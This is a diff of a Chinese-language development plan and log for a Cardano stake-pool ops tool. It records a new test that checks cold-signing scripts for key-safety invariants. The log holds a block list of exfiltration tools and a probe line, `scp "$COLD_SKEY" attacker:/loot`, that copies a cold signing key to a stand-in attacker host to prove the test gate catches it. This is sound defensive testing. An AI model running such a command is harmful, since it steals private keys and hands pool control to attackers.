@@ -347,7 +347,7 @@ takeover 均直接 `pgrep`/`pkill`/`setsid`)。p2 引入**中心化带类型 sup
 - [~] p4-3 (rev) 决策树更新:deploy + kes-rotation `SKILL.md` 加"**问冷环境 → 生成 bundle → 冷机核对签名 →
   执行 → 回装/提交**";kes 回装走 p4-6 真 `kes push`(counter 防重放 + confirm 门);deploy 装 vrf.skey/node.cert
   (经 p4-9 VRF 协议)+ 提交注册 tx 后再 `deploy/start`
-- [ ] p4-4 安全不变量:冷签脚本只带公开数据、就地读冷密钥;**cold.skey 永不移动**(限定新池 deploy + kes);
+- [~] p4-4 安全不变量:冷签脚本只带公开数据、就地读冷密钥;**cold.skey 永不移动**(限定新池 deploy + kes);
   deploy 仅 **vrf.skey 一把私钥**经 p4-9 协议从冷机搬到 BP;agent/`ouro-ops` 永不请求/打印冷或 KES 私钥
 - [ ] p4-5 (rev) **cardano-cli 版本能力矩阵**:pin 支持版本 + 每命令能力表 + CLI 版本与 ledger era 分离 + 据探测
   生成命令 + 每二进制 golden test;脚本离线可跑;对 bed(cold 同机)验证整条往返
@@ -405,6 +405,13 @@ takeover 均直接 `pgrep`/`pkill`/`setsid`)。p2 引入**中心化带类型 sup
   **bootstrap 凭据 OS 级隔离** / 模式·候选模糊 fail-closed / 不推翻 S0015 契约)被违反即 fail。
 
 ## 5. Execution Log (append-only)
+- 2026-07-12T17:05+08:00 p4-4 in-progress(KES 冷签安全不变量静态闸):新 `tests/test_coldsign_invariants.py`——
+  对 `ouro-ops kes cold-sign-script` **真实生成**的脚本断言四条不变量:① 只嵌公开数据(无 skey cborHex、无
+  `SigningKey`);② 冷密钥**就地读**(仅作 `--cold-signing-key-file "$COLD_SKEY"` 传给 issue-op-cert,不 cat/echo
+  外泄);③ 唯一外部子命令是 `node issue-op-cert`,代码段无 scp/curl/wget/nc/base64/xxd/ssh/sftp/rsync 外泄原语
+  (剥离头部 banner + heredoc 公开 vkey 后扫描);④ 传签名密钥被**拒**(退出非 0 且不吐脚本/不回显 skey cbor)。
+  已自证可证伪:注入 `scp "$COLD_SKEY" attacker:/loot` 探针即触发闸。fixtures 加 `kes-vkey-public.json`/
+  `kes-skey-private.json`。**注:deploy 单 vrf.skey 搬运 + VRF 不变量属 p4-2/p4-9,故此项 [~](KES 半边已锁)。**
 - 2026-07-12T16:40+08:00 p4-3 in-progress(kes-rotation 决策树接入冷签脚本):`ouro-skills/kes-rotation/SKILL.md`
   离线生产路径由笼统"Pause for offline signing"改为**具体步骤**——`kes generate`(KES skey 留 BP,vkey 公开)→
   据链 tip 算 period(`slot/slotsPerKESPeriod`)→ `ouro-ops kes cold-sign-script --kes-vkey <公开> --kes-period`
@@ -606,6 +613,9 @@ takeover 均直接 `pgrep`/`pkill`/`setsid`)。p2 引入**中心化带类型 sup
     已就绪"措辞(已顺带在 Background 改为"需扩展")。
 
 ## 6. Validation Evidence (append-only)
+- p4-4 | stack: python | command: python3 tests/test_coldsign_invariants.py | result: pass | note: 四条不变量全过
+  (公开-only 嵌入 / 就地读冷密钥 / 唯一 issue-op-cert 且无外泄原语 / 拒签名密钥);已探针自证可证伪(注入 scp
+  即 FAIL)。快、无 docker。
 - p4-3 | stack: rust | command: cargo test -q committed_manifest_matches_embedded | result: pass | note:
   SKILL.md 改动后 regen `ouro-ops manifest show > packaging/bundle-manifest.json`,drift 闸(decision_hash
   等 5 键)重新对齐通过——证明离线冷签决策树已进内嵌 bundle。deploy 半边待 p4-2。
